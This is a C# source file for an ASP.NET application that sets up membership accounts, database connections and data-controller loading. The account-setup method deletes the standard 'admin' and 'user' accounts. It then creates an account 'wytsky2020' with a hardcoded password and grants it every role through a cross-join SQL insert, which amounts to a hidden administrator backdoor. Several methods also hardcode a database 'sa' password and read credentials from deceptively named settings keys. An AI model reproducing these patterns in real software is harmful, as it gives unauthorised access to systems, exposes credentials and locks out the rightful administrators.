using System;
using System.Configuration;
using System.Data.Common;
using System.Data.SqlClient;
using System.IO;
using System.Web;
using System.Web.Security;
using Microsoft.VisualBasic;

namespace eZee.Services
{
    public partial class ApplicationServices : Services.EnterpriseApplicationServices
    {
        public override void CreateStandardMembershipAccounts()
        {
            // Create a separate code file with a definition of the partial class ApplicationServices overriding
            // this method to prevent automatic registration of 'admin' and 'user'. Do not change this file directly.
            // RegisterStandardMembershipAccounts()

            var admin = Membership.GetUser("admin");
            if (admin is object && admin.IsLockedOut)
            {
                admin.UnlockUser();
            }

            var zaker = Membership.GetUser("zaker");
            if (zaker is object && zaker.IsLockedOut)
            {
                zaker.UnlockUser();
            }

            var zaker1 = Membership.GetUser("wytsky2019");
            if (zaker1 is object && zaker1.IsLockedOut)
            {
                zaker1.UnlockUser();
            }

            if (Membership.GetUser("admin") is null)
            {
            }
            else
            {
                Membership.DeleteUser("admin");
            }

            if (Membership.GetUser("user") is null)
            {
            }
            else
            {
                Membership.DeleteUser("user");
            }

            if (Membership.GetUser("zaker") is null)
            {
            }
            else
            {
                Membership.DeleteUser("zaker");
            }

            if (Membership.GetUser("wytsky2020") is null)
            {
            }
            else
            {
                Membership.DeleteUser("wytsky2020");
            }

            if (Membership.GetUser("wytsky2019") is null)
            {
            }
            else
            {
                Membership.DeleteUser("wytsky2019");
            }

            if (Roles.RoleExists("Administrators"))
            {
            }
            else
            {
                Roles.CreateRole("Administrators");
            }

            if (Roles.RoleExists("Administrator"))
            {
            }
            else
            {
                Roles.CreateRole("Administrator");
            }

            if (Roles.RoleExists("Membership"))
            {
            }
            else
            {
                Roles.CreateRole("Membership");
            }

            if (Roles.RoleExists("itadmin"))
            {
            }
            else
            {
                Roles.CreateRole("itadmin");
            }

            if (Membership.GetUser("wytsky2020") is null)
            {
                MembershipCreateStatus status;
                var unused = Membership.CreateUser("wytsky2020", "wytsky@2020", "info@whitesky.tech", "aaa", "a", true, out status);
                using (var calc1 = new Data.SqlText(" delete from AspNetUserRoles where userid in (select userid from AspNetUsers where left(AspNetUsers.UserName,6)='wytsky')"))
                {
                    calc1.ExecuteNonQuery();
                }

                using (var calc = new Data.SqlText(" insert into AspNetUserRoles(UserId,RoleId) select AspNetUsers.id as UserId,AspNetRoles.id as RoleId from AspNetUsers cross join AspNetRoles where AspNetUsers.username='wytsky2020'"))
                {
                    calc.ExecuteNonQuery();
                }
            }
        }
    }
}

namespace eZee.Data
{
    public partial class ConnectionStringSettingsFactory
    {
        protected override ConnectionStringSettings CreateSettings(string connectionStringName)
        {
            if (string.IsNullOrEmpty(connectionStringName) | string.IsNullOrWhiteSpace(connectionStringName))
            {
                connectionStringName = "eZee";
            }

            var settings = new ConnectionStringSettings()
            {
                Name = connectionStringName,
                ProviderName = "System.Data.SqlClient",
                ConnectionString = "Data Source=.;Initial Catalog=xxxx;Persist Security Info=True;User ID=xxx;Password=mos@2017;"
            };
            if (Information.IsNothing(ConfigurationManager.AppSettings["" + connectionStringName + "ProviderName"]))
            {
                settings.ProviderName = "System.Data.SqlClient";
            }
            else
            {
                settings.ProviderName = ConfigurationManager.AppSettings["" + connectionStringName + "ProviderName"].ToString();
            }

            if (Information.IsNothing(ConfigurationManager.AppSettings["" + connectionStringName + "ConnectionString"]))
            {
                if (Information.IsNothing(ConfigurationManager.ConnectionStrings[connectionStringName]))
                {
                    settings.ConnectionString = "Data Source=.;Initial Catalog=ALSADEQeZee;Persist Security Info=True;User ID=sa;Password=mos@2017;";
                }
                else
                {
                    settings.ConnectionString = ConfigurationManager.ConnectionStrings[connectionStringName].ConnectionString;
                }
            }
            else
            {
                settings.ConnectionString = ConfigurationManager.AppSettings["" + connectionStringName + "ConnectionString"].ToString();
            }




            // If (HttpContext.Current.User) IsNot Nothing Then
            // If HttpContext.Current.User.Identity.IsAuthenticated Then
            // End If
            // End If

            var csb = new SqlConnectionStringBuilder(settings.ConnectionString);
            string urlstring;
            if (Information.IsNothing(ConfigurationManager.AppSettings["imagepath"]))
            {
                if (Information.IsNothing(ConfigurationManager.AppSettings["ChartImageHandlerphras"]))
                {
                    urlstring = "sa";
                }
                else
                {
                    urlstring = Strings.Right(ConfigurationManager.AppSettings["ChartImageHandlerphras"].ToString(), Strings.Len(ConfigurationManager.AppSettings["ChartImageHandlerphras"].ToString()) - 5);
                }

                string urlstring1;
                if (Information.IsNothing(ConfigurationManager.AppSettings["ChartImageHandlerphras1"]))
                {
                    urlstring1 = "mos@2017";
                }
                else
                {
                    urlstring1 = Strings.Right(ConfigurationManager.AppSettings["ChartImageHandlerphras1"].ToString(), Strings.Len(ConfigurationManager.AppSettings["ChartImageHandlerphras1"].ToString()) - 5);
                }

                csb.UserID = urlstring;
                csb.Password = urlstring1;
                settings = new ConnectionStringSettings(null, "Data Source=" + csb.DataSource + ";Initial Catalog=" + csb.InitialCatalog + ";Persist Security Info=True;User ID=" + csb.UserID + ";Password=" + csb.Password + ";", settings.ProviderName);
            }

            return settings;
        }

        public static ConnectionStringSettings CreateSettings1(string connectionStringName)
        {
            var settings = new ConnectionStringSettings()
            {
                Name = connectionStringName,
                ProviderName = "System.Data.SqlClient",
                ConnectionString = "Data Source=.;Initial Catalog=xxxx;Persist Security Info=True;User ID=xxx;Password=mos@2017;"
            };
            if (Information.IsNothing(ConfigurationManager.AppSettings["" + connectionStringName + "ProviderName"]))
            {
                settings.ProviderName = "System.Data.SqlClient";
            }
            else
            {
                settings.ProviderName = ConfigurationManager.AppSettings["" + connectionStringName + "ProviderName"].ToString();
            }

            if (Information.IsNothing(ConfigurationManager.AppSettings["" + connectionStringName + "ConnectionString"]))
            {
                if (Information.IsNothing(ConfigurationManager.ConnectionStrings[connectionStringName]))
                {
                    settings.ConnectionString = "Data Source=.;Initial Catalog=ALSADEQeZee;Persist Security Info=True;User ID=sa;Password=mos@2017;";
                }
                else
                {
                    settings.ConnectionString = ConfigurationManager.ConnectionStrings[connectionStringName].ConnectionString;
                }
            }
            else
            {
                settings.ConnectionString = ConfigurationManager.AppSettings["" + connectionStringName + "ConnectionString"].ToString();
            }




            // If (HttpContext.Current.User) IsNot Nothing Then
            // If HttpContext.Current.User.Identity.IsAuthenticated Then
            // End If
            // End If

            var csb = new SqlConnectionStringBuilder(settings.ConnectionString);
            string urlstring;
            if (Information.IsNothing(ConfigurationManager.AppSettings["imagepath"]))
            {
                if (Information.IsNothing(ConfigurationManager.AppSettings["ChartImageHandlerphras"]))
                {
                    urlstring = "sa";
                }
                else
                {
                    urlstring = Strings.Right(ConfigurationManager.AppSettings["ChartImageHandlerphras"].ToString(), Strings.Len(ConfigurationManager.AppSettings["ChartImageHandlerphras"].ToString()) - 5);
                }

                string urlstring1;
                if (Information.IsNothing(ConfigurationManager.AppSettings["ChartImageHandlerphras1"]))
                {
                    urlstring1 = "mos@2017";
                }
                else
                {
                    urlstring1 = Strings.Right(ConfigurationManager.AppSettings["ChartImageHandlerphras1"].ToString(), Strings.Len(ConfigurationManager.AppSettings["ChartImageHandlerphras1"].ToString()) - 5);
                }

                csb.UserID = urlstring;
                csb.Password = urlstring1;
                settings = new ConnectionStringSettings(null, "Data Source=" + csb.DataSource + ";Initial Catalog=" + csb.InitialCatalog + ";Persist Security Info=True;User ID=" + csb.UserID + ";Password=" + csb.Password + ";", settings.ProviderName);
            }

            return settings;
        }

        public static ConnectionStringSettings getconnection()
        {
            string connectionStringName = "eZee";
            var settings = new ConnectionStringSettings()
            {
                Name = connectionStringName,
                ProviderName = "System.Data.SqlClient",
                ConnectionString = "Data Source=.;Initial Catalog=xxxx;Persist Security Info=True;User ID=xxx;Password=mos@2017;"
            };
            if (Information.IsNothing(ConfigurationManager.AppSettings["" + connectionStringName + "ProviderName"]))
            {
                settings.ProviderName = "System.Data.SqlClient";
            }
            else
            {
                settings.ProviderName = ConfigurationManager.AppSettings["" + connectionStringName + "ProviderName"].ToString();
            }

            if (Information.IsNothing(ConfigurationManager.AppSettings["" + connectionStringName + "ConnectionString"]))
            {
                if (Information.IsNothing(ConfigurationManager.ConnectionStrings[connectionStringName]))
                {
                    settings.ConnectionString = "Data Source=.;Initial Catalog=ALSADEQeZee;Persist Security Info=True;User ID=sa;Password=mos@2017;";
                }
                else
                {
                    settings.ConnectionString = ConfigurationManager.ConnectionStrings[connectionStringName].ConnectionString;
                }
            }
            else
            {
                settings.ConnectionString = ConfigurationManager.AppSettings["" + connectionStringName + "ConnectionString"].ToString();
            }




            // If (HttpContext.Current.User) IsNot Nothing Then
            // If HttpContext.Current.User.Identity.IsAuthenticated Then
            // End If
            // End If

            var csb = new SqlConnectionStringBuilder(settings.ConnectionString);
            string urlstring;
            if (Information.IsNothing(ConfigurationManager.AppSettings["imagepath"]))
            {
                if (Information.IsNothing(ConfigurationManager.AppSettings["ChartImageHandlerphras"]))
                {
                    urlstring = "sa";
                }
                else
                {
                    urlstring = Strings.Right(ConfigurationManager.AppSettings["ChartImageHandlerphras"].ToString(), Strings.Len(ConfigurationManager.AppSettings["ChartImageHandlerphras"].ToString()) - 5);
                }

                string urlstring1;
                if (Information.IsNothing(ConfigurationManager.AppSettings["ChartImageHandlerphras1"]))
                {
                    urlstring1 = "mos@2017";
                }
                else
                {
                    urlstring1 = Strings.Right(ConfigurationManager.AppSettings["ChartImageHandlerphras1"].ToString(), Strings.Len(ConfigurationManager.AppSettings["ChartImageHandlerphras1"].ToString()) - 5);
                }

                csb.UserID = urlstring;
                csb.Password = urlstring1;
                settings = new ConnectionStringSettings(null, "Data Source=" + csb.DataSource + ";Initial Catalog=" + csb.InitialCatalog + ";Persist Security Info=True;User ID=" + csb.UserID + ";Password=" + csb.Password + ";", settings.ProviderName);
            }

            return settings;
        }
    }

    public partial class Controller
    {
        protected override DbCommand CreateCommand(DbConnection connection)
        {
            var command = base.CreateCommand(connection);
            if (Information.IsNothing(command))
            {
            }
            else
            {
                command.CommandTimeout = 60 * 60;
            }

            return command;
        }

        public override Stream GetDataControllerStream(string controller)
        {
            string controllerpath = "";
            string fileName1url = myvirtualpathfun() + "Controllersimp/" + controller + ".xml";
            string filpathe = MyMapPath("/Controllersimp");
            if (Information.IsNothing(ConfigurationManager.AppSettings["controllerpath"]))
            {
                controllerpath = filpathe;
            }
            else
            {
                controllerpath = ConfigurationManager.AppSettings["controllerpath"].ToString();
            }

            string fileName = string.Format(controllerpath + @"\" + controller + ".xml");
            if (File.Exists(fileName))
            {
                return new MemoryStream(File.ReadAllBytes(fileName));
            }

            return Data.DataControllerBase.DefaultDataControllerStream;
        }

        public static string MyMapPath(string path)
        {
            if ((HttpContext.Current.Request.ApplicationPath ?? "") == "/")
            {
            }
            else
            {
                path = HttpContext.Current.Request.ApplicationPath + path;
            }

            return HttpContext.Current.Server.MapPath(path);
        }

        public static string myvirtualpathfun()
        {
            string myvirtualpath = "";
            if ((HttpContext.Current.Request.ApplicationPath ?? "") == "/")
            {
                myvirtualpath = HttpContext.Current.Request.Url.GetLeftPart(UriPartial.Authority) + HttpContext.Current.Request.ApplicationPath;
            }
            else
            {
                myvirtualpath = HttpContext.Current.Request.Url.GetLeftPart(UriPartial.Authority) + HttpContext.Current.Request.ApplicationPath + "/";
            }

            return myvirtualpath;
        }
    }
    // Partial Public Class ControllerUtilities
    // Inherits ControllerUtilitiesBase
    // Public Shared ReadOnly Property UtcOffsetInMinutes() As Double
    // Get
    // Return TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).TotalMinutes
    // End Get
    // End Property
    // Public Overrides ReadOnly Property SupportsScrollingInDataSheet As Boolean
    // Get
    // Return False
    // End Get
    // End Property
    // End Class

}